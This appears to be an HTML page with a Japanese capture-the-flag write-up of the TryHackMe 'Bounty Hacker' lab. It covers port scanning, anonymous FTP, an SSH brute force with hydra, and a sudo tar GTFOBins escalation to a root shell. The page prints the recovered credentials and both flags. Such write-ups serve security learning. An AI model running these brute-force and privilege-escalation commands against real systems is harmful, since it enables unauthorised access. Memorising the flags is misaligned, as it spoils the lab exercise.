@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Bounty Hacker Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Bounty Hacker</h1>
+    <p>匿名 FTP、Web 列挙、SSH、sudo tar GTFOBins。</p>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Linux</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+    
+    <article class="writeup-body">
+      <p><code>nmap --script=vuln</code>を実施</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ nmap 10.49.154.8 --script=vuln           
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 10:22 +0900
+Nmap scan report for 10.49.154.8
+Host is up (0.13s latency).
+Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-enum: 
+|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
+
+Nmap done: 1 IP address (1 host up) scanned in 44.54 seconds
+
+</code></pre>
+<p><code>ftp</code>,<code>ssh</code>,<code>http</code>がopenになっていた<br>
+わっかりやすい脆弱性はヒットしなかったが<code>http-enum</code>にていくつかのディレクトリはヒットした</p>
+<p>つづいてバージョン情報なども探ってみる</p>
+<pre><code class="language-bash">──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ nmap -sV -sC -oX scan.xml -T4 -p- 10.49.154.8
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 10:18 +0900
+Nmap scan report for 10.49.154.8
+Host is up (0.13s latency).
+Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: PASV failed: 550 Permission denied.
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.205.211
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 4c:3a:26:4f:a5:82:c4:3a:db:9e:1d:15:2f:df:a4:79 (RSA)
+|   256 82:90:cb:e2:c5:8f:ce:91:84:37:c0:e5:7a:18:85:ba (ECDSA)
+|_  256 83:7f:22:07:d4:da:81:d3:a7:cb:a8:28:9f:d8:14:e8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 358.75 seconds
+</code></pre>
+<p><code>scan.xml</code>を用いてsearchsploitにないか探す</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ searchsploit --nmap scan.xml    
+[i] SearchSploit's XML mode (without verbose enabled).   To enable: searchsploit -v --xml...
+[i] Reading: 'scan.xml'
+
+[-] Skipping term: ftp   (Term is too general. Please re-search manually: /usr/bin/searchsploit -t ftp)
+
+[i] /usr/bin/searchsploit -t vsftpd
+------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+vsftpd 2.0.5 - 'CWD' (Authenticated) Remot | linux/dos/5814.pl
+vsftpd 2.0.5 - 'deny_file' Option Remote D | windows/dos/31818.sh
+vsftpd 2.0.5 - 'deny_file' Option Remote D | windows/dos/31819.pl
+vsftpd 2.3.2 - Denial of Service           | linux/dos/16270.c
+vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/17491.rb
+vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/49757.py
+vsftpd 3.0.3 - Remote Denial of Service    | multiple/remote/49719.py
+------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+[i] /usr/bin/searchsploit -t vsftpd 3.0.5
+[-] Skipping term: ssh   (Term is too general. Please re-search manually: /usr/bin/searchsploit -t ssh)
+
+[i] /usr/bin/searchsploit -t openssh
+------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+Debian OpenSSH - (Authenticated) Remote SE | linux/remote/6094.txt
+Dropbear / OpenSSH Server - 'MAX_UNAUTH_CL | multiple/dos/1572.pl
+FreeBSD OpenSSH 3.5p1 - Remote Command Exe | freebsd/remote/17462.txt
+glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x | linux/local/258.sh
+Novell Netware 6.5 - OpenSSH Remote Stack  | novell/dos/14866.txt
+OpenSSH 1.2 - '.scp' File Create/Overwrite | linux/remote/20253.sh
+OpenSSH 2.3 &lt; 7.7 - Username Enumeration   | linux/remote/45233.py
+OpenSSH 2.3 &lt; 7.7 - Username Enumeration ( | linux/remote/45210.py
+OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off | unix/remote/21314.txt
+OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token | linux/remote/21402.txt
+OpenSSH 3.x - Challenge-Response Buffer Ov | unix/remote/21578.txt
+OpenSSH 3.x - Challenge-Response Buffer Ov | unix/remote/21579.txt
+OpenSSH 4.3 p1 - Duplicated Block Remote D | multiple/dos/2444.sh
+OpenSSH 6.8 &lt; 6.9 - 'PTY' Local Privilege  | linux/local/41173.c
+OpenSSH 7.2 - Denial of Service            | linux/dos/40888.py
+OpenSSH 7.2p1 - (Authenticated) xauth Comm | multiple/remote/39569.py
+OpenSSH 7.2p2 - Username Enumeration       | linux/remote/40136.py
+OpenSSH &lt; 6.6 SFTP (x64) - Command Executi | linux_x86-64/remote/45000.c
+OpenSSH &lt; 6.6 SFTP - Command Execution     | linux/remote/45001.py
+OpenSSH &lt; 7.4 - 'UsePrivilegeSeparation Di | linux/local/40962.txt
+OpenSSH &lt; 7.4 - agent Protocol Arbitrary L | linux/remote/40963.txt
+OpenSSH &lt; 7.7 - User Enumeration (2)       | linux/remote/45939.py
+OpenSSH SCP Client - Write Arbitrary Files | multiple/remote/46516.py
+OpenSSH server (sshd) 9.8p1 - Race Conditi | linux/remote/52269.c
+OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Us | linux/remote/26.sh
+OpenSSH/PAM 3.6.1p1 - Remote Users Discove | linux/remote/25.c
+OpenSSHd 7.2p2 - Username Enumeration      | linux/remote/40113.txt
+Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Tim | multiple/remote/3303.sh
+------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+[i] /usr/bin/searchsploit -t openssh 8.2p1 ubuntu 4ubuntu0.13
+[-] Skipping term: http   (Term is too general. Please re-search manually: /usr/bin/searchsploit -t http)
+
+[i] /usr/bin/searchsploit -t apache httpd
+------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+Apache 0.8.x/1.0.x / NCSA HTTPd 1.x - 'tes | cgi/remote/20435.txt
+Apache 1.1 / NCSA HTTPd 1.5.2 / Netscape S | multiple/dos/19536.txt
+Apache Httpd mod_proxy - Error Page Cross- | multiple/webapps/47688.md
+Apache Httpd mod_rewrite - Open Redirects  | multiple/webapps/47689.md
+NCSA 1.3/1.4.x/1.5 / Apache HTTPd 0.8.11/0 | multiple/remote/20595.txt
+------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+[i] /usr/bin/searchsploit -t apache httpd 2.4.41
+
+</code></pre>
+<p>バージョンまで一致したものはヒットしなかった<br>
+whatwebをやっておく</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ whatweb http://10.49.154.8            
+http://10.49.154.8 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.49.154.8]
+</code></pre>
+<p>feroxbusterでもやってみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ feroxbuster -u http://10.49.154.8  
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben &quot;epi&quot; Risher 🤓                 ver: 2.13.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.49.154.8/
+ 🚩  In-Scope Url          │ 10.49.154.8
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.13.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        9l       28w      311c http://10.49.154.8/images =&gt; http://10.49.154.8/images/
+301      GET        9l       28w      315c http://10.49.154.8/javascript =&gt; http://10.49.154.8/javascript/
+200      GET     2388l    12398w  1132176c http://10.49.154.8/images/crew.jpg
+200      GET       30l      153w      969c http://10.49.154.8/
+301      GET        9l       28w      322c http://10.49.154.8/javascript/jquery =&gt; http://10.49.154.8/javascript/jquery/
+200      GET    10363l    41520w   271756c http://10.49.154.8/javascript/jquery/jquery
+[####################] - 85s    90016/90016   0s      found:6       errors:1775   
+[####################] - 81s    30000/30000   372/s   http://10.49.154.8/ 
+[####################] - 1s     30000/30000   21994/s http://10.49.154.8/images/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 80s    30000/30000   374/s   http://10.49.154.8/javascript/ 
+[####################] - 80s    30000/30000   374/s   http://10.49.154.8/javascript/jquery/                                                                                                                                            
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ curl http://10.49.154.8            
+&lt;html&gt;
+
+&lt;style&gt;
+h3 {text-align: center;}
+p {text-align: center;}
+.img-container {text-align: center;}
+&lt;/style&gt;
+
+&lt;div class='img-container'&gt;
+        &lt;img src=&quot;/images/crew.jpg&quot; tag alt=&quot;Crew Picture&quot; style=&quot;width:1000;height:563&quot;&gt;
+&lt;/div&gt;
+
+&lt;body&gt;
+&lt;h3&gt;Spike:&quot;..Oh look you're finally up. It's about time, 3 more minutes and you were going out with the garbage.&quot;&lt;/h3&gt;
+
+&lt;hr&gt;
+
+&lt;h3&gt;Jet:&quot;Now you told Spike here you can hack any computer in the system. We'd let Ed do it but we need her working on something else and you were getting real bold in that bar back there. Now take a look around and see if you can get that root the system and don't ask any questions you know you don't need the answer to, if you're lucky I'll even make you some bell peppers and beef.&quot;&lt;/h3&gt;
+
+&lt;hr&gt;
+
+&lt;h3&gt;Ed:&quot;I'm Ed. You should have access to the device they are talking about on your computer. Edward and Ein will be on the main deck if you need us!&quot;&lt;/h3&gt;
+
+&lt;hr&gt;
+
+&lt;h3&gt;Faye:&quot;..hmph..&quot;&lt;/h3&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ 
+</code></pre>
+<p>手がかりがつかめず迷子になった！</p>
+<hr>
+<p>ftpの項目を見ると<code>Anonymous FTP login allowed</code>とあるので<br>
+<code>ftp anounymous@10.59.154.8</code>してみる</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ ftp anonymous@10.49.154.8 
+Connected to 10.49.154.8.
+220 (vsFTPd 3.0.5)
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+550 Permission denied.
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
+-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
+226 Directory send OK.
+ftp&gt; cat locks.txt
+?Invalid command.
+ftp&gt; get locks.txt
+local: locks.txt remote: locks.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for locks.txt (418 bytes).
+100% |********************************|   418        5.31 MiB/s    00:00 ETA
+226 Transfer complete.
+418 bytes received in 00:00 (3.04 KiB/s)
+ftp&gt; get task.txt
+local: task.txt remote: task.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for task.txt (68 bytes).
+100% |********************************|    68       97.36 KiB/s    00:00 ETA
+226 Transfer complete.
+68 bytes received in 00:00 (0.49 KiB/s)
+ftp&gt; exit
+221 Goodbye.
+</code></pre>
+<p><code>get</code>コマンドを使って見つかったテキストファイルをダウンロードした<br>
+ftpサーバへのログインは共有フォルダへのログインのようなものらしい</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ cat locks.txt              
+rEddrAGON
+ReDdr4g0nSynd!cat3
+Dr@gOn$yn9icat3
+R3DDr46ONSYndIC@Te
+ReddRA60N
+R3dDrag0nSynd1c4te
+dRa6oN5YNDiCATE
+ReDDR4g0n5ynDIc4te
+R3Dr4gOn2044
+RedDr4gonSynd1cat3
+R3dDRaG0Nsynd1c@T3
+Synd1c4teDr@g0n
+reddRAg0N
+REddRaG0N5yNdIc47e
+Dra6oN$yndIC@t3
+4L1mi6H71StHeB357
+rEDdragOn$ynd1c473
+DrAgoN5ynD1cATE
+ReDdrag0n$ynd1cate
+Dr@gOn$yND1C4Te
+RedDr@gonSyn9ic47e
+REd$yNdIc47e
+dr@goN5YNd1c@73
+rEDdrAGOnSyNDiCat3
+r3ddr@g0N
+ReDSynd1ca7e
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ cat task.txt 
+1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ 
+</code></pre>
+<p>レッドドラゴンがどうとか言っている</p>
+<p>linをユーザー名として、sshにブルートフォースを仕掛ける<br>
+パスワードはレッドドラゴンのどれかじゃないかな<br>
+<code>hydra -l lin -P locks.txt ssh://10.49.154.8</code>を実施する</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ hydra -l lin -P locks.txt ssh://10.49.154.8
+Hydra v9.6 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 10:53:58
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
+[DATA] attacking ssh://10.49.154.8:22/
+[22][ssh] host: 10.49.154.8   login: lin   password: RedDr4gonSynd1cat3
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-14 10:54:05
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ 
+</code></pre>
+<p>なんか見つかったっぽい</p>
+<p>ログインしていく</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/bountyHacker]
+└─$ ssh lin@10.49.154.8      
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+lin@10.49.154.8's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+Last login: Mon Aug 11 12:32:35 2025 from 10.23.8.228
+lin@ip-10-49-154-8:~/Desktop$ whoami
+lin
+lin@ip-10-49-154-8:~/Desktop$ pwd
+/home/lin/Desktop
+lin@ip-10-49-154-8:~/Desktop$ ls
+user.txt
+lin@ip-10-49-154-8:~/Desktop$ cat user.txt
+THM{CR1M3_SyNd1C4T3}
+lin@ip-10-49-154-8:~/Desktop$ 
+</code></pre>
+<p>つぎは権限昇格</p>
+<pre><code class="language-bash">lin@ip-10-49-154-8:~/Desktop$ sudo -l
+[sudo] password for lin: 
+Matching Defaults entries for lin on ip-10-49-154-8:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User lin may run the following commands on ip-10-49-154-8:
+    (root) /bin/tar
+</code></pre>
+<p><code>tar</code>でGTOBinsを探してみる</p>
+<p><code>tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code>があったのでやってみる</p>
+<pre><code class="language-bash">lin@ip-10-49-154-8:/$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar: Removing leading `/' from member names
+# whoami
+root
+# find / -name root.txt 2&gt;/dev/null
+/root/root.txt
+# cat /root/root.txt
+THM{80UN7Y_h4cK3r}
+# 
+</code></pre>
+<p>おわり</p>
+    </article>
+  </main>
+
+  <footer>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/bountyhacker">https://tryhackme.com/room/bountyhacker</a></p>
+  </footer>
+</body>
+</html>
